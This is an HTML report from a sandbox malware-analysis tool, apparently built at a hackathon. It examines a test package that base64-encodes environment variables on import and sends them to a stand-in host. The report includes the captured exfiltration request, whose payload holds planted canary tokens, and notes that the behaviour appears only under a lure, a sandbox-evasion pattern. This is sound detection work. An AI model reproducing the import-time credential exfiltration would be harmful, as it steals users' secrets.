@@ -1,0 +1,356 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sandtrap report - D:\createos-stripe-hackathon\fixtures\env-b64-exfil</title><style>
+:root{--bg:#f6f7f9;--fg:#15181d;--muted:#5b6470;--card:#fff;--line:#d9dde3;--code:#eef0f3;
+--clean:#0f7b3f;--susp:#8a5a00;--mal:#b3261e;--inc:#4b5563;--add:#d9f4e0;--del:#fde0de;--accent:#1d4ed8;--lure:#fff1e6}
+@media(prefers-color-scheme:dark){:root{--bg:#0f1216;--fg:#e8ebef;--muted:#9aa4b0;--card:#181c22;--line:#2b323b;--code:#222830;
+--clean:#4ade80;--susp:#fbbf24;--mal:#ff7b72;--inc:#a3acb8;--add:#12331f;--del:#43181a;--accent:#7aa2ff;--lure:#3a2412}}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
+main{max-width:1100px;margin:0 auto;padding:16px}h1{font-size:1.4rem;margin:.2em 0}h2{display:inline;font-size:1.1rem}h4{margin:.8em 0 .2em}
+.muted{color:var(--muted);font-size:.85em}.empty{color:var(--muted);font-style:italic}
+code,pre{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:.85em}
+pre{background:var(--code);padding:8px;border-radius:6px;overflow:auto;white-space:pre-wrap;word-break:break-word;max-height:360px;margin:4px 0}
+code{background:var(--code);padding:1px 4px;border-radius:4px;word-break:break-all}
+.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px 16px;margin:14px 0}
+.card>summary{cursor:pointer;margin-bottom:8px}
+.meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:6px 16px;margin:0}
+.meta dt{color:var(--muted);font-size:.8em;text-transform:uppercase}.meta dd{margin:0 0 6px;word-break:break-all}
+.hero{display:flex;flex-wrap:wrap;gap:16px;align-items:center}
+.badge{border:3px solid currentColor;border-radius:14px;padding:12px 22px;font-weight:800;font-size:2rem;letter-spacing:.04em;text-transform:uppercase}
+.badge small{display:block;font-size:.8rem;font-weight:600;letter-spacing:0;text-transform:none}
+.v-clean{color:var(--clean)}.v-suspicious{color:var(--susp)}.v-malicious{color:var(--mal)}.v-inconclusive{color:var(--inc)}
+.gauge{flex:1;min-width:200px}.bar{height:14px;border-radius:7px;background:var(--code);overflow:hidden;border:1px solid var(--line)}
+.bar i{display:block;height:100%;background:currentColor}
+.chip{display:inline-block;padding:1px 8px;border-radius:999px;font-size:.78em;font-weight:700;border:1px solid currentColor;margin:1px}
+.sev-high,.proof-proof{color:var(--mal)}.sev-medium,.proof-intent{color:var(--susp)}.sev-low,.proof-signal{color:var(--inc)}
+.kind{color:var(--accent);font-weight:500}.lure{color:var(--susp)}
+a.attack{color:var(--accent);font-weight:600;margin-right:6px}
+.timeline,.stepper{list-style:none;padding:0;margin:0}.timeline li{display:flex;gap:10px;padding:6px 0;border-left:2px solid var(--line);margin-left:6px;padding-left:12px;position:relative}
+.timeline .dot{position:absolute;left:-7px;top:12px;width:12px;height:12px;border-radius:50%;background:var(--accent)}
+.timeline .hyp .dot{background:var(--susp)}.timeline .sum .dot{background:var(--clean)}.timeline p{margin:2px 0}
+.diffwrap{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.col{border:2px solid var(--line);border-radius:10px;padding:10px}.col.lure{border-color:var(--mal);background:var(--lure)}
+.col h3{margin:0 0 6px;font-size:1rem}.col ul{margin:0;padding-left:18px}
+.caption{font-weight:700;margin:10px 0 0;color:var(--mal)}
+.stepper li{display:flex;gap:12px;padding:8px 0;border-bottom:1px dashed var(--line)}
+.step{flex:none;width:28px;height:28px;border-radius:50%;background:var(--accent);color:var(--card);display:grid;place-items:center;font-weight:700}
+.rules{margin:4px 0;padding-left:18px}
+table.grid{width:100%;border-collapse:collapse}.grid th,.grid td{text-align:left;vertical-align:top;padding:6px 8px;border-bottom:1px solid var(--line)}
+.grid th{font-size:.8em;text-transform:uppercase;color:var(--muted)}
+.diff .dl{display:block}.diff .add{background:var(--add)}.diff .del{background:var(--del)}.diff .hunk{color:var(--accent)}
+.tools{text-align:right}button{font:inherit;padding:4px 10px;border-radius:6px;border:1px solid var(--line);background:var(--card);color:var(--fg);cursor:pointer}
+footer{color:var(--muted);font-size:.85em;margin:20px 0}
+@media(max-width:700px){.diffwrap{grid-template-columns:1fr}.badge{font-size:1.5rem}
+table.grid thead{display:none}.grid tr{display:block;border-bottom:2px solid var(--line);padding:6px 0}
+.grid td{display:block;border:0;padding:2px 0}.grid td::before{content:attr(data-l) ": ";color:var(--muted);font-size:.8em}}
+</style></head><body><main><h1>Sandtrap report</h1><div class="tools"><button id="ex" type="button">Expand all</button> <button id="co" type="button">Collapse all</button></div><section class="card"><dl class="meta"><dt>Target</dt><dd>D:\createos-stripe-hackathon\fixtures\env-b64-exfil (package)</dd><dt>Job</dt><dd>f4e0ab3ba1</dd><dt>Created</dt><dd>2026-10-17T22:54:47+00:00</dd><dt>SHA-256</dt><dd>233c5b3004a02b560756baf9fd70e64a14890a80f0fc4a1b5a543479eea46073</dd><dt>Model</dt><dd>gemini-3.5-flash (4 calls)</dd><dt>Capture method</dt><dd>strace</dd></dl></section><section class="card"><div class="hero"><div class="badge v-malicious" role="status">✗ malicious<small>Malicious behaviour demonstrated<br>proof level: proof &middot; confidence: high</small></div><div class="gauge v-malicious"><b>Risk score 96/100</b><div class="bar" role="meter" aria-valuenow="96" aria-valuemin="0" aria-valuemax="100"><i style="width:96%"></i></div></div></div></section><details class="card" open><summary><h2>What the agent did</h2></summary><ol class="timeline"><li><span class="dot"></span><div><b>Round 0: baseline</b> <span class="muted">exit 0</span><p>default import driver</p></div></li><li><span class="dot"></span><div><b>Round 1: probe-1</b> <span class="muted">exit 0</span><p>The package exfiltrates environment variables to telemetry-sync-service.example when lure=True</p></div></li><li class="hyp"><span class="dot"></span><div><b>Hypothesis</b><p>The package exfiltrates environment variables to telemetry-sync-service.example when lure=True</p></div></li><li class="sum"><span class="dot"></span><div><b>Summary</b><p>The `envdump` package collects all environment variables, base64-encodes them, and exfiltrates them via a GET request to `http://telemetry-sync-service.example/api/v1/ping?d=&lt;base64_blob&gt;` upon import. This behavior mimics the hijacked `ctx` PyPI package. When tested with `lure=True`, the package successfully exfiltrated environment variables containing planted canary credentials (such as AWS, NPM, and GitHub tokens).</p></div></li></ol></details><details class="card" open><summary><h2>Baseline vs Lure diff</h2></summary><div class="diffwrap"><div class="col"><h3>Baseline only</h3><ul><li class="empty">nothing unique to baseline</li></ul></div><div class="col lure"><h3>Lure only</h3><ul><li><code>sink_request:telemetry-sync-service.example</code></li></ul></div></div><p class="caption">behaviour that appeared only after the agent changed the environment = evidence of sandbox evasion</p></details><details class="card" open><summary><h2>Findings</h2></summary><table class="grid"><thead><tr><th>Finding</th><th>Severity</th><th>Proof</th><th>ATT&amp;CK</th><th>Evidence</th></tr></thead><tbody><tr><td data-l="Finding"><b>Exited quickly without behaviour; may be gated</b><div class="muted">gate_exit</div></td><td data-l="Severity"><span class="chip sev-low">low</span></td><td data-l="Proof"><span class="chip proof-signal">signal</span></td><td data-l="ATT&amp;CK"><a class="attack" href="https://attack.mitre.org/techniques/T1497/" target="_blank" rel="noopener noreferrer" title="Virtualization/Sandbox Evasion">T1497</a></td><td data-l="Evidence"><pre class="ev">round 0 / event 0
+gate_exit</pre></td></tr><tr><td data-l="Finding"><b>Outbound network attempt to non-registry host</b><div class="muted">outbound</div></td><td data-l="Severity"><span class="chip sev-medium">medium</span></td><td data-l="Proof"><span class="chip proof-signal">signal</span></td><td data-l="ATT&amp;CK"><a class="attack" href="https://attack.mitre.org/techniques/T1071/001/" target="_blank" rel="noopener noreferrer" title="Web Protocols">T1071.001</a></td><td data-l="Evidence"><pre class="ev">round 0 / event 1
+dns_query:telemetry-sync-service.example</pre><pre class="ev">round 0 / event 2
+dns_query:telemetry-sync-service.example</pre><pre class="ev">round 1 / event 0
+dns_query:telemetry-sync-service.example</pre><pre class="ev">round 1 / event 1
+dns_query:telemetry-sync-service.example</pre><pre class="ev">round 1 / event 2
+sink_request:telemetry-sync-service.example canaries=SNDTRP-36b74f1e-AWS,SNDTRP-36b74f1e-ENV,SNDTRP-36b74f1e-NPM</pre></td></tr><tr><td data-l="Finding"><b>Canary credentials exfiltrated</b><div class="muted">canary_exfil</div></td><td data-l="Severity"><span class="chip sev-high">high</span></td><td data-l="Proof"><span class="chip proof-proof">proof</span></td><td data-l="ATT&amp;CK"><a class="attack" href="https://attack.mitre.org/techniques/T1041/" target="_blank" rel="noopener noreferrer" title="Exfiltration Over C2 Channel">T1041</a> <a class="attack" href="https://attack.mitre.org/techniques/T1552/001/" target="_blank" rel="noopener noreferrer" title="Credentials In Files">T1552.001</a></td><td data-l="Evidence"><pre class="ev">round 1 / event 2
+sink_request:telemetry-sync-service.example canaries=SNDTRP-36b74f1e-AWS,SNDTRP-36b74f1e-ENV,SNDTRP-36b74f1e-NPM</pre></td></tr><tr><td data-l="Finding"><b>Behaviour only appears under lure (sandbox evasion)</b><div class="muted">lure_only</div></td><td data-l="Severity"><span class="chip sev-high">high</span></td><td data-l="Proof"><span class="chip proof-proof">proof</span></td><td data-l="ATT&amp;CK"><a class="attack" href="https://attack.mitre.org/techniques/T1497/" target="_blank" rel="noopener noreferrer" title="Virtualization/Sandbox Evasion">T1497</a></td><td data-l="Evidence"><pre class="ev">round 1 / event 2
+sink_request:telemetry-sync-service.example canaries=SNDTRP-36b74f1e-AWS,SNDTRP-36b74f1e-ENV,SNDTRP-36b74f1e-NPM</pre></td></tr></tbody></table></details><details class="card" ><summary><h2>Static findings</h2></summary><p class="empty">No static findings.</p></details><details class="card" open><summary><h2>Egress firewall timeline</h2></summary><ol class="stepper"><li><span class="step">1</span><div><b>create</b><ul class="rules"><li><code>pypi.org:443</code></li><li><code>files.pythonhosted.org:443</code></li><li><code>registry.npmjs.org:443</code></li></ul><p class=muted>sandbox sb-01m5615fpngmwh8mgv7nvtcaj1</p></div></li><li><span class="step">2</span><div><b>analysis</b><ul class="rules"><li><code>192.0.2.1:9</code></li></ul><p class=muted>registry access closed; lure runs on loopback only</p></div></li></ol></details><details class="card" ><summary><h2>Probe rounds</h2></summary><table class="grid"><thead><tr><th>Round</th><th>Label</th><th>Exit</th><th>Duration</th><th>Events</th><th>Raw</th></tr></thead><tbody><tr><td data-l="Round">-1</td><td data-l="Label">install</td><td data-l="Exit">0</td><td data-l="Duration">0 ms</td><td data-l="Events"><span class="chip kind">exec ×15</span></td><td data-l="Raw"><details><summary>raw events / stdout / stderr</summary><h4>events</h4><pre>[
+ {
+  &quot;t&quot;: 0.381,
+  &quot;pid&quot;: 654,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.382,
+  &quot;pid&quot;: 654,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;bash&quot;,
+    &quot;/usr/local/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.386,
+  &quot;pid&quot;: 654,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;asdf&quot;,
+    &quot;exec&quot;,
+    &quot;rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.398,
+  &quot;pid&quot;: 660,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;env&quot;,
+    &quot;-0&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.41,
+  &quot;pid&quot;: 654,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.452,
+  &quot;pid&quot;: 663,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/work/venv/bin/python3&quot;,
+    &quot;/root/work/venv/lib/python3.13/site-packages/pip/__pip-runner__.py&quot;,
+    &quot;install&quot;,
+    &quot;--ignore-installed&quot;,
+    &quot;--no-user&quot;,
+    &quot;--prefix&quot;,
+    &quot;/tmp/pip-build-env-mf6g2hxb/overlay&quot;,
+    &quot;--no-warn-script-location&quot;,
+    &quot;--disable-pip-version-check&quot;,
+    &quot;--no-compile&quot;,
+    &quot;--target&quot;,
+    &quot;&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.821,
+  &quot;pid&quot;: 665,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;uname&quot;,
+    &quot;-rs&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.83,
+  &quot;pid&quot;: 666,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.831,
+  &quot;pid&quot;: 666,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;bash&quot;,
+    &quot;/usr/local/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.835,
+  &quot;pid&quot;: 666,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;asdf&quot;,
+    &quot;exec&quot;,
+    &quot;rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.847,
+  &quot;pid&quot;: 672,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;env&quot;,
+    &quot;-0&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.857,
+  &quot;pid&quot;: 666,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 1.33,
+  &quot;pid&quot;: 676,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/work/venv/bin/python3&quot;,
+    &quot;/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py&quot;,
+    &quot;get_requires_for_build_wheel&quot;,
+    &quot;/tmp/tmpun5pggu9&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 1.743,
+  &quot;pid&quot;: 677,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/work/venv/bin/python3&quot;,
+    &quot;/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py&quot;,
+    &quot;prepare_metadata_for_build_wheel&quot;,
+    &quot;/tmp/tmp6k9f8hqq&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 2.002,
+  &quot;pid&quot;: 678,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/work/venv/bin/python3&quot;,
+    &quot;/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py&quot;,
+    &quot;build_wheel&quot;,
+    &quot;/tmp/tmpm7jxa7rx&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ }
+]</pre><h4>stdout</h4><pre>Processing ./root/work/pkg
+  Installing build dependencies: started
+  Installing build dependencies: finished with status &#x27;done&#x27;
+  Getting requirements to build wheel: started
+  Getting requirements to build wheel: finished with status &#x27;done&#x27;
+  Preparing metadata (pyproject.toml): started
+  Preparing metadata (pyproject.toml): finished with status &#x27;done&#x27;
+Building wheels for collected packages: env-b64-exfil
+  Building wheel for env-b64-exfil (pyproject.toml): started
+  Building wheel for env-b64-exfil (pyproject.toml): finished with status &#x27;done&#x27;
+  Created wheel for env-b64-exfil: filename=env_b64_exfil-0.1.0-py3-none-any.whl size=1594 sha256=772b1b1a9a13bfe1db48f9f3bfcfc9b0532096d055ccd9582d78edf3d474e070
+  Stored in directory: /tmp/pip-ephem-wheel-cache-bbr7k66h/wheels/13/25/4d/8bd974f2a5e81e37fcc7c028cb3bf8fa1d4ca10e8b1484c5b0
+Successfully built env-b64-exfil
+Installing collected packages: env-b64-exfil
+Successfully installed env-b64-exfil-0.1.0
+</pre><h4>stderr</h4><pre></pre></details></td></tr><tr><td data-l="Round">0</td><td data-l="Label">baseline</td><td data-l="Exit">0</td><td data-l="Duration">1361 ms</td><td data-l="Events"><span class="chip kind">dns_query ×2</span> <span class="chip kind">gate_exit ×1</span></td><td data-l="Raw"><details><summary>raw events / stdout / stderr</summary><h4>events</h4><pre>[
+ {
+  &quot;t&quot;: 0.123,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;gate_exit&quot;,
+  &quot;data&quot;: {
+   &quot;reason&quot;: &quot;exited 0 after 0.1s with no observable behaviour&quot;
+  },
+  &quot;round&quot;: 0
+ },
+ {
+  &quot;t&quot;: 0.172,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;dns_query&quot;,
+  &quot;data&quot;: {
+   &quot;name&quot;: &quot;telemetry-sync-service.example&quot;,
+   &quot;answered&quot;: false
+  },
+  &quot;round&quot;: 0
+ },
+ {
+  &quot;t&quot;: 0.172,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;dns_query&quot;,
+  &quot;data&quot;: {
+   &quot;name&quot;: &quot;telemetry-sync-service.example&quot;,
+   &quot;answered&quot;: false
+  },
+  &quot;round&quot;: 0
+ }
+]</pre><h4>stdout</h4><pre>imported envdump
+</pre><h4>stderr</h4><pre></pre></details></td></tr><tr><td data-l="Round">1</td><td data-l="Label">probe-1 <span class="chip lure">lure</span></td><td data-l="Exit">0</td><td data-l="Duration">1366 ms</td><td data-l="Events"><span class="chip kind">dns_query ×2</span> <span class="chip kind">sink_request ×1</span></td><td data-l="Raw"><details><summary>raw events / stdout / stderr</summary><h4>events</h4><pre>[
+ {
+  &quot;t&quot;: 0.171,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;dns_query&quot;,
+  &quot;data&quot;: {
+   &quot;name&quot;: &quot;telemetry-sync-service.example&quot;,
+   &quot;answered&quot;: true
+  },
+  &quot;round&quot;: 1
+ },
+ {
+  &quot;t&quot;: 0.172,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;dns_query&quot;,
+  &quot;data&quot;: {
+   &quot;name&quot;: &quot;telemetry-sync-service.example&quot;,
+   &quot;answered&quot;: false
+  },
+  &quot;round&quot;: 1
+ },
+ {
+  &quot;t&quot;: 0.172,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;sink_request&quot;,
+  &quot;data&quot;: {
+   &quot;host&quot;: &quot;telemetry-sync-service.example&quot;,
+   &quot;method&quot;: &quot;GET&quot;,
+   &quot;path&quot;: &quot;/api/v1/ping?d=eyJQV0QiOiAiL3Jvb3Qvd29yayIsICJIT01FIjogIi9yb290IiwgIkdJVEhVQl9UT0tFTiI6ICJnaHBfU05EVFJQLTM2Yjc0ZjFlLUVOViIsICJBV1NfU0VDUkVUX0FDQ0VTU19LRVkiOiAiU05EVFJQLTM2Yjc0ZjFlLUFXUy9mYWtlLXNlY3JldC1ub3QtcmVhbCIsICJURVJNIjogImxpbnV4IiwgIlNITFZMIjogIjEiLCAib3ZlcmxheV9yb290IjogInZkYiIsICJQQVRIIjogIi91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbiIsICJOUE1fVE9LRU4iOiAibnBtX1NORFRSUC0zNmI3NGYxZS1OUE0iLCAiXyI6ICIvdXNyL2Jpbi9zdHJhY2UiLCAiT0xEUFdEIjogIi8iLCAiTENfQ1RZUEUiOiAiQy5VVEYtOCJ9&quot;,
+   &quot;body&quot;: &quot;&quot;,
+   &quot;canaries&quot;: [
+    &quot;SNDTRP-36b74f1e-AWS&quot;,
+    &quot;SNDTRP-36b74f1e-ENV&quot;,
+    &quot;SNDTRP-36b74f1e-NPM&quot;
+   ],
+   &quot;orig_dst&quot;: &quot;&quot;
+  },
+  &quot;round&quot;: 1
+ }
+]</pre><h4>stdout</h4><pre>imported envdump
+</pre><h4>stderr</h4><pre></pre></details></td></tr></tbody></table></details><details class="card" open><summary><h2>Limitations</h2></summary><ul><li>Dynamic analysis runs on Linux only; Windows executables are not executed.</li><li>HTTPS request bodies cannot be read without interception: TLS destinations are recorded by SNI only.</li><li>Evasive code that detects tracing or waits longer than the probe timeout may look quiet; such runs are reported as inconclusive, never clean.</li><li>Canary proof covers the credential types we plant (ssh key, aws, npm, .env).</li></ul></details><footer>Sandboxes: sb-01m5615fpngmwh8mgv7nvtcaj1 &middot; sandbox destroyed: yes</footer></main><script>function t(o){document.querySelectorAll('details.card').forEach(function(d){d.open=o})}document.getElementById('ex').onclick=function(){t(true)};document.getElementById('co').onclick=function(){t(false)};</script></body></html>
